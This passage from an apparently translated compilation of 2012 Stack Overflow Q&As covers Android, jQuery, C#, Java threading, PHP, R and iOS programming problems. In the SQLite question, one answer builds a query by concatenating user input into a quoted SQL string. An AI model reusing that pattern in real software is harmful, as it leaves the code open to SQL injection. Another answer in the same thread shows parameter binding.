if (event.sensor.getType() == Sensor.TYPE_ACCELEROMETER)
{   
mGravity = event.values.clone();    
}
if (event.sensor.getType() == Sensor.TYPE_MAGNETIC_FIELD)
{
    mGeomagnetic = event.values.clone();
}

SensorManager.getRotationMatrix(RR, I, mGravity, mGeomagnetic);
SensorManager.getOrientation(RR, orientation);
azimuth = orientation[0];
pitch = orientation[1];
roll = orientation[2];
System.out.println("Pitch " + pitch); 
```

# javascript - 在当前方法上禁用实时事件

> ID：12603860
> 
> 赞同：0
> 
> 时间：2012-09-26T14:21:50.340
> 
> 标签：javascript, jquery, ruby-on-rails, coffeescript

在视图中，我有以下课程

```
.class{"data-id" => time.id} 
```

在视图结束时，我启用了实时点击事件

```
$('.class').live("click", function() {
    window.orc.time.stopCount();
    window.orc.time.whenClicked(#{class.id}, #{class.time}, #    
{class.start});}); 
```

在咖啡脚本中，我具有以下功能

```
time.whenClicked = (class.id, time_dur, time_start) -> 
   ct = time_entries.to_time(time_dur, time_start)
   $("div[data-id=#{time_id}]").addClass "ajax"
   $("div[data-id=#{time_id}]").html("<input id=\"editbox\" size=\"8\" type=\"text\" value=\"#{ct}\">") 
   $("#editbox").bind "keyup", (event) ->
     ... 
```

在 whenClicked 函数中，我需要禁用 live("click") 。如果我尝试

```
$(".class").die("click") 
```

它可以工作，但是只有在我刷新页面后才会重新启用点击事件，这不是我需要的。

是否有解决方案在执行该功能之前禁用点击事件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:25:57.490

不要禁用处理程序。只需实现一个布尔标志，以便您知道该方法是否已经在运行。在这种情况下，您可以立即从处理程序返回：

```
var isBusy = false;

$('.class').live('click', function(){
    if(isBusy) return;
    isBusy = true;
    window.orc.time.stopCount();
    window.orc.time.whenClicked(/* some params */);
    isBusy = false;
}); 
```

# android - 无法获取带有字母数字值的 sqlite 记录

> ID：12603862
> 
> 赞同：0
> 
> 时间：2012-09-26T14:21:52.033
> 
> 标签：android, sqlite, map, hashmap

我正在使用下面的代码在我的 android 应用程序中获取一个 sqlite 记录。此代码获取数值，但不获取字母数字值。

例如：tempno 为2 时取记录，tempno 为2A 时不取记录。

我使用的所有变量都是“字符串”数据类型。

```
public Map<String, Object> getDetails(String tempno) throws SQLException{
    Map<String, Object> map = new HashMap<String, Object>();
    Cursor mCursor = db.query(true, DATABASE_TABLE, new String[] {SOURCE, DESTINATION, ROUTELENGTH, NOTE}, ROUTENO + "=" + tempno, null, null, null, null, null); 
```

我正在从另一个类调用下面的代码。

请让我知道我哪里出错了。

```
Map<String, Object> temp = dbAdapt.getDetails(tempno); 
```

以下是Logcat中的错误

```
 09-26 18:42:52.108: E/AndroidRuntime(2363): android.database.sqlite.SQLiteException: unrecognized token: "2A": , while compiling: SELECT DISTINCT source, destination, routelength, note FROM route WHERE routeno=2A 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:26:53.943

将其更改为：

```
public Map<String, Object> getDetails(String tempno) throws SQLException{       
  Map<String, Object> map = new HashMap<String, Object>();     
  Cursor mCursor = db.query(true, DATABASE_TABLE, new String[] {SOURCE, DESTINATION, ROUTELENGTH, NOTE}, ROUTENO + "='" + tempno+"'", null, null, null, null, null); 

//ROUTENO + "='" + tempno+"'", 
```

这是一个快速而肮脏的解决方案，但它有效。这不是将值放入 sql 字符串的常用方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:48:46.070

使用`query`'s 参数替换而不是您自己的：

```
public Map<String, Object> getDetails(String tempno) throws SQLException{
    Map<String, Object> map = new HashMap<String, Object>();
    Cursor mCursor = db.query(true, DATABASE_TABLE, new String[] {SOURCE, DESTINATION, ROUTELENGTH, NOTE}, ROUTENO + "= ?", new String[] { tempno }, null, null, null, null); 
```

# c# - 如何使用您在 Visual Studio C# .Net 中引用的项目的 dll？

> ID：12603864
> 
> 赞同：0
> 
> 时间：2012-09-26T14:21:59.653
> 
> 标签：c#, visual-studio-2010, dll

假设我的解决方案中有一个项目 A。项目 A 有两个 dll，Office.dll 和 Microsoft.Office.Interop.Excel.dll。

我的解决方案中有另一个项目是项目 B。项目 B 有对项目 A 的引用。所以如果我们要检查项目 B 的引用，它上面有 ProjectA.dll。

我见过这样的解决方案。如果要发布项目 B（发布模式）并且我们检查它的 bin 文件夹，它也会有 Office.dll 和 Microsoft.Office.Interop.Excel.dll，即使它们没有在其 csproj 中声明。我假设由于项目 B 引用了项目 A，它也会复制项目 A 的 dll。

这种情况真的会发生吗？因为我正在尝试这样做，但我没有成功复制它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:31:27.340

在所有引用的 DLL 的引用中，查看属性。在“复制本地”属性中，确保将其设置为 true。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:34:31.393

你可以设置你的`CopyLocal on true`

确定是否将引用复制到本地 bin 路径。

![在此处输入图像描述](../Images/7ca7656714886c895a6d6e344cc0cc89.png)

链接： http: [//msdn.microsoft.com/en-us/library/aa984582 (v=vs.71).aspx](http://msdn.microsoft.com/en-us/library/aa984582(v=vs.71).aspx)

![在此处输入图像描述](../Images/4a1df256548f8e7030f3615b7630aa58.png)

# surface - 如何在 SlimDX 中使用 FOURCC 格式？

> ID：12603865
> 
> 赞同：1
> 
> 时间：2012-09-26T14:22:02.023
> 
> 标签：surface, slimdx, fourcc

查看[SlimDX 定义的表面格式](http://slimdx.org/docs/#T_SlimDX_Direct3D9_Format)，似乎缺少一些。我对使用[**NV12**格式](http://www.fourcc.org/yuv.php)很感兴趣。

由于格式被定义为枚举，因此我无法传入 FOURCC 格式，因为[我可以使用非托管代码](http://msdn.microsoft.com/en-us/library/bb172558.aspx#FOURCC_Formats)。

有没有办法解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T11:05:04.680

SlimDX 枚举被定义为整数，因此您可以将任何整数转换为它。

```
int nvformat = 12345; //Replace number by the fourcc
SlimDX.Direct3D9.Format fmt = (SlimDX.Direct3D9.Format)nvformat; 
```

# c# - 我如何获得小于位图宽度的步幅？

> ID：12603872
> 
> 赞同：0
> 
> 时间：2012-09-26T14:22:13.033
> 
> 标签：c#, image-processing, bitmapdata

我正在从一个 1bpp 位图复制到一个较小的 1bpp 位图。我只想剪掉一个区域，这样我就可以计算黑色像素的数量。

我使用以下内容制作副本：

```
 private Bitmap Copy(Bitmap srcBitmap, Rectangle section)
    {
        BitmapData SourceLockedData;
        BitmapData DestLockedData;
        Rectangle DestRect;
        byte[] SrcImageData;
        byte[] DestImageData;
        int ByteCount;
        int WidthCount = 0;
        int CurrentLine = 0;
        int DestStride;
        int SrcStride = 0;

        // Create the new bitmap and associated graphics object
        Bitmap Newbmp = new Bitmap(section.Width, section.Height, PixelFormat.Format1bppIndexed);
        Newbmp.SetResolution(srcBitmap.HorizontalResolution, srcBitmap.VerticalResolution);

        //Lock the bits
        SourceLockedData = srcBitmap.LockBits(section, ImageLockMode.ReadWrite, PixelFormat.Format1bppIndexed);

        SrcStride = SourceLockedData.Stride;

        //Get a count of the number of bytes to copy. Remember, bytes are not pixels.
        ByteCount = SourceLockedData.Stride * SourceLockedData.Height;

        //Initialize the source byte array
        SrcImageData = new byte[ByteCount];

        //Copy the data to the source byte array
        Marshal.Copy(SourceLockedData.Scan0, SrcImageData, 0, ByteCount);

        //Unlock the bits
        srcBitmap.UnlockBits(SourceLockedData);

        //Set a rectangle to the size of the New bitmap
        DestRect = new Rectangle(new Point(0, 0), Newbmp.Size);

        //Lock the bits
        DestLockedData = Newbmp.LockBits(DestRect, ImageLockMode.ReadWrite, PixelFormat.Format1bppIndexed);

        DestStride = DestLockedData.Stride;

        //Get a count of the number of bytes to copy. Remember, bytes are not pixels.
        ByteCount = DestLockedData.Stride * DestLockedData.Height;

        //Initialize the source byte array
        DestImageData = new byte[ByteCount];

        //Copy the data to the destination byte array
        Marshal.Copy(DestLockedData.Scan0, DestImageData, 0, ByteCount);

        //Unlock for now
        Newbmp.UnlockBits(DestLockedData);

        for (int ArrayIndex = 0; ArrayIndex < ByteCount; ArrayIndex++)
        {
            if (WidthCount == Newbmp.Width)
            {
                //increment the line and push the index by the stride
                ArrayIndex = (++CurrentLine) * DestStride;
                continue;
            }

            DestImageData[ArrayIndex] = SrcImageData[ArrayIndex];
            WidthCount++;
        }

        //Lock the bits again
        DestLockedData = Newbmp.LockBits(DestRect, ImageLockMode.ReadWrite, PixelFormat.Format1bppIndexed);

        //Copy data from byte array to IntPtr
        Marshal.Copy(DestImageData, 0, DestLockedData.Scan0, ByteCount);

        //Unlock bits
        Newbmp.UnlockBits(DestLockedData);

        // Return the bitmap
        return Newbmp;
    } 
```

我遇到的最大问题是 SourceLockedData.Stride 和 DestLockedData.Stride 都小于各自图像的宽度。这个怎么可能？从我所知道的关于步幅的所有信息中，它是从一条数据扫描线到下一条数据扫描线的位数。这在数学上怎么可能小于宽度？

我是否使用了 LockBits 或 BitmapData 错误？BitmapData 不能被信任吗？我应该手动计算步幅吗？

汤姆·P。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T15:07:32.967

我发现如果您正在处理 RLE 位图，步幅可以小于宽度。因为我加载的位图是 TIFF，所以它们是 RLE8 编码的。

# android - 从正常的 Activity 启动 FragmentActivity.. java.lang.NoClassDefFoundError

> ID：12603873
> 
> 赞同：3
> 
> 时间：2012-09-26T14:22:22.697
> 
> 标签：android, android-activity, noclassdeffounderror, android-fragmentactivity

我试图`FragmentActivity`从一个正常的开始`Activity`，我在日志中得到这个`java.lang.NoClassDefFoundError`，而应用程序崩溃了。

我应该更改清单中的任何内容以便能够`FragmentActivity`在我的应用程序中使用 a 吗？

有没有其他人遇到过这个错误？你怎么修好它的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T15:39:51.723

也许是一个愚蠢的暗示。但是您确定已将 FragmentActivity 插入到您的清单文件中吗？

如果是这样，请尝试将其插入清单：

```
<uses-sdk
    android:minSdkVersion="4"
    android:targetSdkVersion="8" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-27T03:35:41.567

该`android-support-v4`库包含一个错误。

因此，使用 android 版本 4.2.2 创建一个新项目。复制文件`android-support-v4.jar`，然后粘贴到您的项目中。

我这样解决问题！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T02:06:02.097

此处指出了该问题： [FragmentActivity 导致 ClassNotFoundException](https://stackoverflow.com/questions/9931040/fragmentactivity-causing-classnotfoundexception)

请更新 sdk 工具。它应该可以解决问题。

# memory - 带有 stl 向量的 shm_open 和 mmap

> ID：12603876
> 
> 赞同：3
> 
> 时间：2012-09-26T14:22:34.407
> 
> 标签：memory, vector, mapping, posix, shared

我读过 stl 向量不适用于 SYS V 共享内存。但是，如果我使用 POSIX shm_open 然后使用 NULL 的 mmap (mmap(NULL, LARGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0) 并给出比包含我的向量的对象大得多的大小，并且在映射后添加附加项目到向量，除了超过 LARGE_SIZE 空间之外还有其他问题吗？其他相关问题：在最近的 SUSE linux 上是否保证在不相关的进程中映射到相同的起始地址（使用上述语法）时，我的对象将被直接映射并且不执行（系统）复制以实现进程中的更改值（例如在 mmap-ed 时正常打开和正常文件会发生什么情况）？谢谢！

编辑：这是正确的吗？

```
void* mem = allocate_memory_with_mmap(); // say from a shared region
MyType* ptr = new ( mem ) MyType( args );
ptr.~MyType() //is this really needed? 
```

现在在一个不相关的过程中：

```
MyType* myptr = (MyType*)fetch_address_from_mmap(...)
myptr->printHelloWorld();
myptr->myvalue = 1; //writes to shared memory
myptr.~MyType() //is this really needed? 
```

现在如果我想释放内存

```
munmap(address...) //but this done only once, when none of the processes use it any more 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-26T14:37:38.350

您错过了这样一个事实，即 STL 向量通常只是 的一个元组`(mem pointer, mem size, element count)`，其中包含对象的实际内存是从[`allocator`](http://en.cppreference.com/w/cpp/memory/allocator)模板参数接收的。

将 的实例`std::vector`放在共享内存中没有任何意义。您可能想改为查看[`boost::interprocess`](http://www.boost.org/doc/libs/1_51_0/doc/html/interprocess.html)图书馆。

### 编辑0：

内存分配和对象构造是两个不同的阶段，尽管组合在一个语句中，如下所示（除非`new`为 重新定义运算符`MyType`）：

```
// allocates from process heap and constructs
MyType* ptr = new MyType( args ); 
```

[**您可以使用Placement new**](https://stackoverflow.com/questions/222557/what-uses-are-there-for-placement-new)拆分这两个阶段：

```
void* mem = allocate_memory_somehow(); // say from a shared region
MyType* ptr = new ( mem ) MyType( args ); 
```

尽管现在您必须显式调用析构函数并释放内存：

```
ptr->~MyType();
release_memory_back_to_where_it_came_from( ptr ); 
```

这本质上就是在 C++ 中如何在共享内存中构造对象。请注意，存储指针的类型不适合共享内存，因为一个进程内存空间中的任何指针在另一个进程内存空间中都没有任何意义。改为使用显式大小和偏移量。

希望这可以帮助。

# java - 元素没有附加源代码 Java.Lang

> ID：12603886
> 
> 赞同：-1
> 
> 时间：2012-09-26T14:23:03.490
> 
> 标签：java, javadoc

您好我正在尝试使用双对象，而不是类型来同步线程。这是一个家庭作业。

概述：此应用程序是银行系统的一个简单示例，它具有作为存款人运行的线程和作为取款人运行的线程。存款人添加 10 美元，取款人删除 10 美元，因此应用程序结束时应该有 10 个未更改的银行账户。

在每个类别（存款人和取款人）中，我都能够在帐户对象上使用块同步来实现目标。所以我的作业的家庭作业部分已经完成，我不需要帮助。

我开始思考，我觉得锁定整个 Account 对象太过分了。因为交易中唯一真正重要的部分是改变变量

```
 balance 
```

最初可变余额是双倍的。我的目标是将变量更改为 Double 对象，然后将同步块移动到 account 对象内部，并且仅围绕修改 balance 变量的代码部分。

当我将代码更改为 Double 时，没有错误，但我收到一条注释：

```
This element has no attached source and the Javadoc could not be found in the attached Javadoc 
```

此外，代码不起作用，因为我的价值观最后都错了。

问题：

1.  我的理论是否正确，我应该只能锁定 Balance 变量？
2.  如何让我的代码识别 Double 的 Java.lang 代码？

谢谢

这是一些代码...

宣言：

```
private Double balance; 
```

构造函数：

```
this.balance = new Double(balance); 
```

锁定：

```
synchronized(balance){

balance = balance + amount;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T15:24:29.187

> 我的理论是否正确，我应该只能锁定 Balance 变量？

不。

```
synchronized(balance) {
    balance = balance + amount;
} 
```

当您锁定 时`balance`，您实际上是在锁定作为*值*`Double`的实例，而不是在变量上。但是然后你用不同的实例*替换*值。如果出现其他线程，它可能会在当前线程释放它（仍然）持有的旧锁之前看到新的并获取它的锁。换句话说，你没有得到适当的互斥。此外，不满足“之前发生”关系的先决条件，因此线程可能会看到共享变量和对象的不一致版本。 *`balance``balance`*`balance``Double``Double``Double`**

 **如果你想锁定一个实例变量，你需要锁定它是一个实例的对象。

* * *

> 如何让我的代码识别 Double 的 Java.lang 代码？

这是一个 IDE 问题。IDE 找不到与 IDE 已配置为使用的“rt.jar”文件对应的源 JAR 文件。这很可能是因为您必须在 IDE 中使用 JRE 中的“rt.jar”文件。解决方案是重新配置您的 IDE 以使用与 JRE 对应的 JDK。

请注意，这不会改变您的程序的工作方式。它只会影响 IDE 在（例如）您单步进入核心类时向您显示源代码的能力。**

# php - 从 Eclipse 中启动时，phpunit 在启动时忽略 /etc/php5/cli/conf.d 目录

> ID：12603887
> 
> 赞同：1
> 
> 时间：2012-09-26T14:23:06.150
> 
> 标签：php, eclipse, phpunit, php-ini

> **可能重复：**
> [当我在 Eclipse 中调试 PHP 脚本时，它不加载 mysql 扩展](https://stackoverflow.com/questions/5784327/while-i-am-debugging-php-script-in-eclipse-it-doesnt-load-mysql-extension)

**如何让 phpunit 扫描 /etc/php5/cli/conf.d 目录中的 ini 文件？**

我正在使用phpunit，但是正确配置非常耗时。我刚刚遇到的一个问题是，当我从 Eclipse 中将 phpunit 作为“运行配置”启动时，我的 php 扩展的 ini 文件似乎没有正确加载。我基本上遵循了本教程： http: [//pkp.sfu.ca/wiki/index.php/Configure_Eclipse_for_PHPUnit](http://pkp.sfu.ca/wiki/index.php/Configure_Eclipse_for_PHPUnit)

从 Eclipse 中运行时（菜单运行.../运行配置...），然后是目录

```
/etc/php5/cli/conf.d 
```

这与

```
/etc/php5/conf.d/ 
```

不被解析。因此，例如，文件

```
/etc/php5/conf.d/curl.ini 
```

被忽略。我必须将单行添加到ini文件

```
 echo "extension=curl.so" >> /etc/php5/cli/php.ini 
```

这似乎解决了问题，但适得其反，因为它破坏了模块化（并且将在下一次 distri / php 升级后消失）

为了找到这个问题，我修改了 phpunit.php，在文件开头添加了对 phpinfo() 的调用。

这是输出。

```
PHP Version => 5.3.10-1ubuntu3.4

System => Linux wb3 3.2.0-31-generic #50-Ubuntu SMP Fri Sep 7 16:16:45 UTC 2012 x86_64
Build Date => Sep 12 2012 18:58:31
Server API => Command Line Interface
Virtual Directory Support => disabled
Configuration File (php.ini) Path => /etc/php5/cli
Loaded Configuration File => /tmp/zend_debug/session6700026373526677062.tmp/php.ini
Scan this dir for additional .ini files => (none)
Additional .ini files parsed => (none) 
```

当我检查 /tmp/zend_debug/session6700026373526677062.tmp/php.ini 时：

使用 grep -C 2 扩展

我没有输出。

将 extension=curl.so 添加到 /etc/php5/cli/php.ini 后，当我运行 phpunit Eclipse-Run-configuration 时会加载 curl 扩展

但是当我从命令行运行 phpunit 时，结果会有所不同。现在我明白了

```
phpunit --debug --verbose  MyClass 
PHP Warning:  Module 'curl' already loaded in Unknown on line 0 
```

**更新：（还没有答案）**

我找到了解决我的问题的方法：

我在文件系统中创建了一个自定义 php.ini 文件，其中包含所有附加的包含，并且在 Eclipse Preferences for PHP 中，我使用我的专用 php.ini 为 php5 解释器创建了一个新配置。

在 Eclipse Run-Configuration Menu 中，设置 Config 对话框，我只是指向新的 php5-configuration。

但这并不能解决问题，所以我仍在寻找答案。是 Eclipse 问题还是 phpunit - 问题？我现在不知道。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-09T01:03:27.807

这是 Eclipse PDT 的预期行为。有关更多信息，请参阅[类似问题和我的回答](https://stackoverflow.com/questions/5784327/while-i-am-debugging-php-script-in-eclipse-it-doesnt-load-mysql-extension/6393850#6393850)。

# z3 - 我如何获得 k 其中 k 来自 F_k for pdr in muz？

> ID：12603889
> 
> 赞同：2
> 
> 时间：2012-09-26T14:23:13.703
> 
> 标签：z3

我在 Z3 中使用 muZ，它有这个新的通用 PDR。我想知道如何获得有关 PDR 算法的一些数据。PDR 算法的不变量如下：

```
I => F_0
F_i => F_{i+1} for 0 <= i < k
F_i => P for 0 <= i <= k
F_i /\ T => F'_{i + 1} 
```

我对终止时的 k 值非常感兴趣。这个统计数据是否可用？如果我在查询中启用 :print-statistics true ，我看不到它：

```
(query (p x) :print-statistics true) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-27T03:17:04.257

统计功能目前并没有详细说明 PDR（它应该并感谢您指出这一点）。此时，您可以通过以详细模式运行它来获取更多信息。它将迭代计数打印到 stderr 流。

例如：

```
z3.exe bakery.smt2 /v:1
Entering level 1
Entering level 2
Entering level 3
Entering level 4
Entering level 5
Entering level 6
.... followed by inductive assertions ... 
```

# r - 使用变量在 data.table 中传递列名

> ID：12603890
> 
> 赞同：113
> 
> 时间：2012-09-26T14:23:17.960
> 
> 标签：r, data.table

> **可能重复：**
> [可变地选择/分配给 data.table 中的字段](https://stackoverflow.com/questions/12391950/variably-selecting-assigning-to-fields-in-a-data-table)

在以下示例中，我正在创建一个列名为“x”和“v”的数据表</p>

```
library('data.table')
DT <- data.table(x = c("b","b","b","a","a"), v = rnorm(5)) 
```

我可以通过以下方式访问“x”列的值：

```
DT[ , x]
# [1] "b" "b" "b" "a" "a" 
```

但是如果我想通过一个变量来访问，它就行不通

```
temp <- "x"
DT[ , temp]
# [1] "x" 
```

会有多个列，我将不得不为其中几个选择值。我将通过 R 模块提供这些列名。

没关系，我明白了，应该是：

```
DT[ , get(temp)] 
```

* * *

## 回答 #1

> 赞同：62
> 
> 时间：2012-09-26T17:37:51.803

使用`quote()`and`eval()`函数将变量传递给`j`. 当你这样做时，你不需要在列名上加上双引号，因为`quote()`-ed 字符串将在`DT[]`

```
temp <- quote(x)
DT[ , eval(temp)]
# [1] "b" "b" "b" "a" "a" 
```

使用单个列名，结果是一个向量。如果您想要 data.table 结果或多列，请使用列表形式

```
temp <- quote(list(x, v))
DT[ , eval(temp)]
#   x           v
# 1: b  1.52566586
# 2: b  0.66057253
# 3: b -1.29654641
# 4: a -1.71998260
# 5: a  0.03159933 
```

# php - 在 CakePHP 中使用 read 方法加载额外的模型数据

> ID：12603894
> 
> 赞同：0
> 
> 时间：2012-09-26T14:23:33.723
> 
> 标签：php, cakephp

我在编辑方法中有以下代码，允许用户编辑他们的帐户详细信息。它同时使用 User 和 Profile 模型，并且应该同时更新两者。

我使用 find 中的 contains 来加载 Profile 信息，并使用控制器顶部的 $uses var 调用 Profile 模型。

但是如何将两个模型都加载到 read 方法中呢？

```
$user = $this->User->find('first', array( 
                    'conditions' => array('User.id' => $this->Auth->user('id')),
                    'contain'=>'Profile'
                ));

        if ($this->request->is('post') || $this->request->is('put'))
        {
            if ($this->User->save($this->request->data))
            {
                $this->Session->setFlash(__('Your account has been saved'));
                $this->redirect(array('controller'=>'users','action'=>'edit'));
            }
            else
            {
                $this->Session->setFlash(__('Whoops! Something went wrong... try again?'));
            }
        }
        else
        {
            $this->request->data = $this->User->read(null, $user['User']['id']);
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:35:39.763

据我从文档中可以看出，`read()`只带来了预期的字段。如果您想阅读相关的模型，请`find`改用。

而不是这个：

```
$this->request->data = $this->User->read(null, $user['User']['id']); 
```

用这个：

```
$this->request->data = $this->User->find('all', 
       array(
         'conditions' => array('User.id' => $user['User']['id']), 
         'contain'    => 'Profile'
       )
); 
```

[http://book.cakephp.org/1.3/en/view/1018/find](http://book.cakephp.org/1.3/en/view/1018/find)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:53:31.647

您可以在 read() 之前调用 contains() 方法。

```
$this->User->contain(array('Profile'));
$this->request->data = $this->User->read(null, $user['User']['id']); 
```

请注意，在调用 find() 的 read() 之后，此调用 contains() 的效果不会持续存在。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T15:15:08.440

刚刚这样做：`$this->request->data = $user;`

而且似乎工作正常。任何人都可以看到这样做有什么问题吗？

# javascript - 优化 JQuery

> ID：12603896
> 
> 赞同：4
> 
> 时间：2012-09-26T14:23:44.843
> 
> 标签：javascript, jquery, optimization

优化（缩短）这段代码的最佳方法是什么？我正在使用 Jquery UI 插件“选择菜单”分配给选定数量的元素。

```
$('footer#footer form select').selectmenu({
    style: 'dropdown',
    appendTo: 'footer#footer form span'
});

$('form.filters section.grid .industry select').selectmenu({
    style: 'dropdown',
    appendTo: 'form.filters section.grid .industry'
});

$('form.filters section.grid .subject select').selectmenu({
    style: 'dropdown',
    appendTo: 'form.filters section.grid .subject'
});

$('form.filters section.grid .year select').selectmenu({
    style: 'dropdown',
    appendTo: 'form.filters section.grid .year'
});

$('form.filters section.grid .organiser select').selectmenu({
    style: 'dropdown',
    appendTo: 'form.filters section.grid .organiser'
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:34:20.100

使用类和`[data-*]`属性将数据传递给 jQuery：

```
$('select.selectMenu').each(function () {
    $(this).selectmenu({
        style: 'dropdown',
        appendTo: $(this).data('target')
    });
}); 
```

这依赖于更改标记，以便选择元素具有正确的类，并将它们的`[data-target]`属性设置为适当的值。

```
<select class="selectMenu" data-target="footer#footer form span">
    ...options...
</select> 
```

* * *

`each`正文和 HTML的几个变体：

### 使用整个`data`对象：

```
$(this).selectmenu($(this).data());

<select data-style="dropdown" data-append-to="footer#footer form span"> 
```

### 使用一个`[data-*]`属性：

```
$(this).selectmenu($(this).data('selectmenu'));

<select data-selectmenu='{"style":"dropdown","appendTo":"footer#footer form span"}'> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:33:01.660

您可以将“选择器”映射到“附加”部分

```
var parts = {
    'footer#footer form select'                  : ' span',
    'form.filters section.grid .industry select' : '',
    'form.filters section.grid .subject select'  : '',
    'form.filters section.grid .year select'     : '',
    'form.filters section.grid .organiser select': ''
};

for (var p in parts) {
    $(p).selectmenu({
        style: 'dropdown',
        appendTo: p.replace(" select", parts[p])
    });
} 
```

* * *

或者你可以这样做。

```
$('footer#footer form select').selectmenu({
    style: 'dropdown',
    appendTo: 'footer#footer form select span'
});

$('form.filters section.grid .row * select').each(function() {
    $(this).selectmenu({
        style: 'dropdown',
        appendTo: $(this).closest('.span3')
    });
}); 
```

# ios - 崩溃日志没有完全符号化

> ID：12603898
> 
> 赞同：1
> 
> 时间：2012-09-26T14:23:54.950
> 
> 标签：ios, symbolicatecrash

我可以在 xcode 4.5 中用符号表示我的崩溃日志，最后一行除外。特别是崩溃日志中“Last Exception Backtrace”的第 29 行和“Thread 0”区域中的第 15 行没有显示对象或方法调用，而其他所有行都显示。我的代码是 CoachMe1。

关于为什么会这样的任何想法？

这是符号化代码：

```
Exception Type:  EXC_CRASH (SIGABRT)
Exception Codes: 0x0000000000000000, 0x0000000000000000
Crashed Thread:  0

Last Exception Backtrace:
0   CoreFoundation                  0x3165929e __exceptionPreprocess + 158
1   libobjc.A.dylib                 0x355af97a objc_exception_throw + 26
2   CoreFoundation                  0x316591c0 +[NSException raise:format:] + 100
3   Foundation                      0x34a9ece2 -[NSKeyedUnarchiver initForReadingWithData:] + 2402
4   CoachMe1                        0x000047b6 -[CoachMe1ViewController viewWillAppear:] (CoachMe1ViewController.m:322)
5   UIKit                           0x32b7531c -[UIViewController _setViewAppearState:isAnimating:] + 132
6   UIKit                           0x32b817a0 -[UINavigationController _startTransition:fromViewController:toViewController:] + 536
7   UIKit                           0x32b814ac -[UINavigationController _startDeferredTransitionIfNeeded:] + 320
8   UIKit                           0x32b6fb8e -[UINavigationController pushViewController:transition:forceImmediate:] + 854
9   UIKit                           0x32b6f82e -[UINavigationController pushViewController:animated:] + 34
10  CoachMe1                        0x000183da -[FrontPageViewController loadGameDashboard] (FrontPageViewController.m:38)
11  UIKit                           0x32bf90a8 -[UIApplication sendAction:to:from:forEvent:] + 68
12  UIKit                           0x32bf905a -[UIApplication sendAction:toTarget:fromSender:forEvent:] + 26
13  UIKit                           0x32bf9038 -[UIControl sendAction:to:forEvent:] + 40
14  UIKit                           0x32bf88ee -[UIControl(Internal) _sendActionsForEvents:withEvent:] + 498
15  UIKit                           0x32bf8de4 -[UIControl touchesEnded:withEvent:] + 484
16  UIKit                           0x32b215f4 -[UIWindow _sendTouchesForEvent:] + 520
17  UIKit                           0x32b0e804 -[UIApplication sendEvent:] + 376
18  UIKit                           0x32b0e11e _UIApplicationHandleEvent + 6150
19  GraphicsServices                0x3085459e _PurpleEventCallback + 586
20  GraphicsServices                0x308541ce PurpleEventCallback + 30
21  CoreFoundation                  0x3162e16e __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE1_PERFORM_FUNCTION__ + 30
22  CoreFoundation                  0x3162e112 __CFRunLoopDoSource1 + 134
23  CoreFoundation                  0x3162cf94 __CFRunLoopRun + 1380
24  CoreFoundation                  0x3159feb8 CFRunLoopRunSpecific + 352
25  CoreFoundation                  0x3159fd44 CFRunLoopRunInMode + 100
26  GraphicsServices                0x308532e6 GSEventRunModal + 70
27  UIKit                           0x32b622fc UIApplicationMain + 1116
28  CoachMe1                        0x0000257e main (main.m:14)
29  CoachMe1                        0x00002538 0x1000 + 5432

Thread 0 name:  Dispatch queue: com.apple.main-thread
Thread 0 Crashed:
0   libsystem_kernel.dylib          0x3934f350 __pthread_kill + 8
1   libsystem_c.dylib               0x33cb111e pthread_kill + 54
2   libsystem_c.dylib               0x33ced96e abort + 90
3   libc++abi.dylib                 0x30803d4a abort_message + 70
4   libc++abi.dylib                 0x30800ff4 _ZL17default_terminatev + 20
5   libobjc.A.dylib                 0x355afa74 _ZL15_objc_terminatev + 144
6   libc++abi.dylib                 0x30801078 _ZL19safe_handler_callerPFvvE + 76
7   libc++abi.dylib                 0x30801110 std::terminate() + 16
8   libc++abi.dylib                 0x30802594 __cxa_rethrow + 84
9   libobjc.A.dylib                 0x355af9cc objc_exception_rethrow + 8
10  CoreFoundation                  0x3159ff1c CFRunLoopRunSpecific + 452
11  CoreFoundation                  0x3159fd44 CFRunLoopRunInMode + 100
12  GraphicsServices                0x308532e6 GSEventRunModal + 70
13  UIKit                           0x32b622fc UIApplicationMain + 1116
14  CoachMe1                        0x0000257e main (main.m:14)
15  CoachMe1                        0x00002538 0x1000 + 5432 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:27:45.793

您的应用程序在类第 38 行中的`loadGameDashboard`功能崩溃。`FrontPageViewController.m`

请用断点检查这个函数。你看到你的应用程序在哪里崩溃了......

# regex - 正则表达式匹配行的任何部分

> ID：12603899
> 
> 赞同：1
> 
> 时间：2012-09-26T14:23:59.887
> 
> 标签：regex, eclipse

我正在使用其 RegEx 搜索功能在 Eclipse 中搜索大型代码库。我需要找到`<script>`没有`src`属性的标签。我是 RegEx 的新手，但能够一起破解一些东西：

```
^.*(^<script(?!.*src).*)$ 
```

这与我正在寻找的标签匹配，但前提是`<script>`标签之前的行没有任何内容。如果有空格或任何东西，它不匹配。

**正确匹配：**

```
<script type="text/javascript"> 
```

**不匹配：**

```
 <script type="text/javascript"> 
```

如何修改我的表达式以使其匹配该行的任何部分？

我也试过在前面加上`^`, `\s*`, `[ ]*`,`(?x)`但没有成功。

